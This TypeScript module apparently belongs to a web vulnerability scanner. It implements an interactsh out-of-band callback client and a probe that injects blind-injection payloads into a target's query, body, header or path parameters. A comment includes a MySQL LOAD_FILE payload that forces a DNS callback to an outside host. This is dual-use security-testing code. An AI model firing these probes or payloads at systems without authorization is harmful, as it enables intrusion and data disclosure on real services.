import { generateKeyPairSync, randomBytes, privateDecrypt, constants as cryptoConstants } from "node:crypto";
import { createDecipheriv } from "node:crypto";
import { writeFile, mkdir, readFile } from "node:fs/promises";
import { join } from "node:path";
import { fetchUrl } from "../adapters/http.js";

/** Out-of-band callback confirmation (interactsh protocol): registers an
 *  RSA keypair with a public interactsh server, mints per-payload
 *  subdomain tokens, and polls for interactions. Turns "suspect" findings
 *  (blind SQLi/SSRF/RCE/file-disclosure payloads) into CONFIRMED via an
 *  actual callback from the target's egress.
 *
 *  Self-contained: no interactsh-client binary, pure HTTP + node:crypto.
 *  Falls back across public servers (oast.site → oast.fun → oast.pro …). */

export interface OobSession {
  readonly server: string;
  readonly correlationId: string;
  readonly token: string; // <cid>.<random>.<host> URL prefix
  readonly privateKeyPem: string;
}

export interface OobInteraction {
  readonly protocol: "http" | "dns" | "smtp" | "tcp" | string;
  readonly fullId: string;
  readonly remoteAddr: string;
  readonly timestamp: string;
  readonly rawRequest?: string;
}

export interface OobClient {
  readonly session: OobSession;
  /** A fresh unique callback URL for one payload. */
  callbackUrl: (label?: string) => string;
  /** Poll once; returns interactions seen since registration. */
  poll: () => Promise<OobInteraction[]>;
}

const SERVERS = ["oast.live", "oast.site", "oast.fun", "oast.pro"] as const;

const b64 = (s: string): string => Buffer.from(s, "utf8").toString("base64");

const uuidLike = (): string => {
  const h = randomBytes(16).toString("hex");
  return `${h.slice(0, 8)}-${h.slice(8, 12)}-${h.slice(12, 16)}-${h.slice(16, 20)}-${h.slice(20)}`;
};

const registerOn = async (server: string, publicKeyB64: string, correlationId: string, secretKey: string): Promise<boolean> => {
  // interactsh protocol: secret-key is a client-chosen UUID, echoed back in
  // /poll?id=<cid>&secret=<secretKey> — NOT derived from the key pair.
  const body = JSON.stringify({ "public-key": publicKeyB64, "secret-key": secretKey, "correlation-id": correlationId, "protocols": ["http", "dns", "smtp"] });
  const r = await fetchUrl(`https://${server}/register`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body,
    timeoutMs: 10000,
  });
  return r.status >= 200 && r.status < 300;
};

export const createOobSession = async (): Promise<OobClient> => {
  const { publicKey, privateKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
  const pubPem = publicKey.export({ type: "spki", format: "pem" }).toString();
  const privPem = privateKey.export({ type: "pkcs8", format: "pem" }).toString();
  // Server-side isCorrelationID: a sliding window of EXACTLY
  // CorrelationIdLength(20) + NonceLength(13) = 33 chars must appear in the
  // hostname label, first 20 in the xid alphabet, last 13 in zbase32.
  // Hex chars 0-9a-f are a subset of xid "0-9a-v", so a 20-hex cid is valid.
  const cid = randomBytes(10).toString("hex"); // 20 chars, xid-compatible
  const secretKey = uuidLike();

  for (const server of SERVERS) {
    const ok = await registerOn(server, b64(pubPem), cid, secretKey);
    if (!ok) continue;
    const token = `${cid}.${server}`;
    const session: OobSession = { server, correlationId: cid, token, privateKeyPem: privPem };
    return {
      session,
      callbackUrl: (label?: string): string => {
        // Hostname label layout the server will recognize:
        //   <cid:20 xid-chars><nonce:13 zbase32-chars>.<server>
        // The 13-char nonce MUST come from the zbase32 alphabet
        // (ybndrfg8ejkmcpqxot1uwisza345h769) — hex digits 0/2 are NOT in it
        // and a wrong-alphabet suffix makes the sliding window never match,
        // silently dropping every interaction (verified against server
        // source: pkg/server/util.go isCorrelationID).
        const ZBASE32 = "ybndrfg8ejkmcpqxot1uwisza345h769";
        let nonce = "";
        const rb = randomBytes(13);
        for (let i = 0; i < 13; i++) nonce += ZBASE32[rb[i]! % ZBASE32.length];
        return `${cid}${nonce}.${server}`;
      },
      poll: async (): Promise<OobInteraction[]> => {
        // GET /poll?id=<cid>&secret=<secretKey> — the secret is the UUID
        // chosen at registration. POLL IS DESTRUCTIVE: the server clears the
        // interaction buffer on every poll (storagedb.go: correlationData.Data
        // = nil), so only ONE consumer may poll — our own loop.
        // Interactions are AES-256-CTR encrypted (IV prefixed); the AES key
        // rides along RSA-OAEP(SHA256)-encrypted in aes_key, decryptable with
        // OUR private key.
        const r = await fetchUrl(`https://${server}/poll?id=${cid}&secret=${secretKey}`, { timeoutMs: 10000 });
        if (r.status !== 200 || !r.body.trim()) return [];
        try {
          const enc = JSON.parse(r.body) as { data?: string[] | null; aes_key?: string };
          const items = enc.data ?? [];
          if (items.length === 0 || !enc.aes_key) return [];
          // Recover the AES key.
          const wrapped = Buffer.from(enc.aes_key, "base64");
          const aesKey = privateDecrypt(
            { key: privPem, padding: cryptoConstants.RSA_PKCS1_OAEP_PADDING, oaepHash: "sha256" },
            wrapped,
          );
          const out: OobInteraction[] = [];
          for (const item of items) {
            try {
              const buf = Buffer.from(item, "base64");
              const iv = buf.subarray(0, 16);
              const ct = buf.subarray(16);
              const decipher = createDecipheriv("aes-256-ctr", aesKey, iv);
              const plain = Buffer.concat([decipher.update(ct), decipher.final()]).toString("utf8");
              if (!plain.trim().startsWith("{")) continue;
              const j = JSON.parse(plain) as Record<string, unknown>;
              out.push({
                protocol: String(j.protocol ?? "unknown"),
                fullId: String(j.fullId ?? ""),
                remoteAddr: String(j["remote-address"] ?? j.remoteAddr ?? ""),
                timestamp: String(j.timestamp ?? ""),
                rawRequest: typeof j["raw-request"] === "string" ? j["raw-request"] : undefined,
              });
            } catch { /* skip undecodable item */ }
          }
          return out;
        } catch {
          return [];
        }
      },
    };
  }
  throw new Error("all interactsh servers refused registration");
};

// ---------------------------------------------------------------------------
// OOB-confirmed payload probe: generic blind-injection detection across
// parameter locations (query/body/header/path) with per-payload unique
// callback URLs. Verdict = a matching interaction was POLLED, not inferred.
// ---------------------------------------------------------------------------

export interface OobProbeInput {
  /** target URL (params injected into query unless positions given) */
  readonly url: string;
  readonly outputRoot: string;
  /** pre-built payloads with {OOB} placeholder, e.g. `"1'||(SELECT LOAD_FILE(CONCAT('\\\\',(SELECT {OOB}.x),'.dns')))||'"` */
  readonly payloads: readonly string[];
  /** param positions: defaults to every query param of `url` */
  readonly positions?: { param: string; in: "query" | "body" | "header" | "path" }[];
  readonly method?: string;
  readonly body?: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  /** ms to poll after firing all payloads (default 15000) */
  readonly pollMs?: number;
}

export interface OobProbeResult {
  readonly fired: number;
  readonly interactions: OobInteraction[];
  /** payload label -> confirmed via callback correlation id */
  readonly confirmed: { payload: string; param: string; interaction: OobInteraction }[];
  readonly artifacts: { path: string; bytes: number }[];
}

export const probeOob = async (input: OobProbeInput): Promise<OobProbeResult> => {
  await mkdir(input.outputRoot, { recursive: true });
  const client = await createOobSession();
  const opts = { proxy: input.proxy, timeoutMs: input.timeoutMs ?? 8000 };

  // Positions default: all query params.
  let positions = input.positions;
  if (!positions) {
    const u = new URL(input.url);
    positions = [...u.searchParams.keys()].map((k) => ({ param: k, in: "query" as const }));
  }

  const fired: { payload: string; param: string; cb: string }[] = [];
  const method = input.method ?? "GET";

  for (const p of input.payloads) {
    for (const pos of positions) {
      // unique callback per (payload,param) pair
      const cbUrl = client.callbackUrl();
      const concrete = p.replaceAll("{OOB}", cbUrl);
      let target = input.url;
      let body = input.body;
      const headers = { ...input.headers };
      if (pos.in === "query") {
        const u = new URL(target);
        u.searchParams.set(pos.param, concrete);
        target = u.toString();
      } else if (pos.in === "body" && body) {
        body = body.replaceAll(`"${pos.param}":"..."`, `"${pos.param}":"${concrete}"`).replaceAll(`"${pos.param}":""`, `"${pos.param}":"${concrete}"`);
        // generic JSON value substitution
        const escParam = pos.param.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
        body = body.replace(new RegExp(`("${escParam}"\\s*:\\s*)"[^"]*"`), `$1"${concrete.replaceAll("$", "$$$$")}"`);
      } else if (pos.in === "header") {
        headers[pos.param] = concrete;
      } else if (pos.in === "path") {
        target = target.replaceAll(encodeURIComponent(pos.param), encodeURIComponent(concrete));
      }
      await fetchUrl(target, { ...opts, method, body, headers });
      fired.push({ payload: p, param: pos.param, cb: cbUrl });
    }
  }

  // Poll window.
  const deadline = Date.now() + (input.pollMs ?? 15000);
  const seen = new Map<string, OobInteraction>();
  while (Date.now() < deadline) {
    await new Promise((r) => setTimeout(r, 3000));
    for (const i of await client.poll()) {
      // fullId is unreliable (observed empty on live traffic) — key on
      // protocol+timestamp+remoteAddr PLUS a raw-request fingerprint: two
      // distinct callbacks in the same second from the same resolver were
      // merged into one, undercounting confirmations.
      const rawFp = String(i.rawRequest ?? "").slice(0, 96);
      const key = `${i.protocol}:${i.timestamp}:${i.remoteAddr}:${rawFp}`;
      seen.set(key, i);
    }
    // keep polling the full window: interactions arrive with jitter
  }

  // Correlate: the server's fullId field is unreliable (observed empty on
  // live traffic); the callback hostname reliably appears in rawRequest
  // (HTTP Host line / DNS QUESTION section).
  const confirmed: OobProbeResult["confirmed"] = [];
  for (const f of fired) {
    const hit = [...seen.values()].find((i) =>
      (i.fullId && i.fullId.includes(f.cb)) ||
      (i.rawRequest ?? "").includes(f.cb));
    if (hit) confirmed.push({ payload: f.payload, param: f.param, interaction: hit });
  }

  const outBody = JSON.stringify({ fired: fired.length, interactions: [...seen.values()], confirmed }, null, 2);
  const path = join(input.outputRoot, "oob_probe.json");
  await writeFile(path, outBody, "utf8");
  return { fired: fired.length, interactions: [...seen.values()], confirmed, artifacts: [{ path, bytes: Buffer.byteLength(outBody) }] };
};

